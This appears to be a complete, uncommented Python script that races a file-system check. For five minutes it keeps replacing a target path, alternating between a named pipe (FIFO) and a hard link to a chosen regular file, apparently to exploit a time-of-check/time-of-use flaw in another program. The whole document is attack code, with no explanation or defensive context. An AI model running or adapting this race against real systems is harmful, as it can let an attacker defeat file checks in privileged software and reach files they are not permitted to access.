import os,sys,time
d,path,reg=sys.argv[1],sys.argv[2],sys.argv[3]
t0=time.time()
while time.time()-t0<300:
    try:
        for s in (d+'.f', d+'.g'):
            if os.path.lexists(s): os.unlink(s)
        os.mkfifo(d+'.f'); os.replace(d+'.f', path)
        os.link(reg, d+'.g'); os.replace(d+'.g', path)
    except OSError: pass
